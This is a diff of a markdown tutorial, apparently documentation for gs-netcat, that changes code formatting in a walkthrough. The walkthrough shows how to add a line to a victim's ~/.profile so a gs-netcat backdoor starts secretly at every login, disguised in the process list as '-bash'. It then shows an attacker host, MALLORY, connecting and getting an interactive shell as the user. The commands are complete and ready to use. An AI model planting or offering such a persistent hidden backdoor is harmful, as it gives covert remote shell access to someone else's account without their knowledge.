@@ -12,8 +12,8 @@ Start gs-netcat from ALICE's *~/.profile* and to so secretly without ALICE notic
 
 
 On "ALICE" add the following line to the end of *~/.profile*. This will start the gs-netcat backdoor every time that ALICE logs in. The gs-netcat process is hidden as *-bash* and shows up as *-bash* in the process list.
-```ShellSession
-alice@ALCIE:~$ killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleKeyXXXXChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)
+```
+killall -0 gs-netcat 2>/dev/null || (GSOCKET_ARGS="-s ExampleKeyXXXXChangeMe -liqD" SHELL=/bin/bash exec -a -bash gs-netcat)
 ```
 
 Immediately start the backdoor:
@@ -23,7 +23,7 @@ alice@ALICE:~$ source ~/.profile
 
 Now log in from "MALLORY" to "ALICE":
 ```ShellSession
-b@MALLORY:~ $ gs-netcat -s ExampleKeyXXXXChangeMe -i
+m@MALLORY:~ $ gs-netcat -s ExampleKeyXXXXChangeMe -i
 =Secret         : "ExampleKeyXXXXChangeMe"
 =Encryption     : SRP-AES-256-CBC-SHA-End2End (Prime: 4096 bits)
 alice@ALICE:~$ id
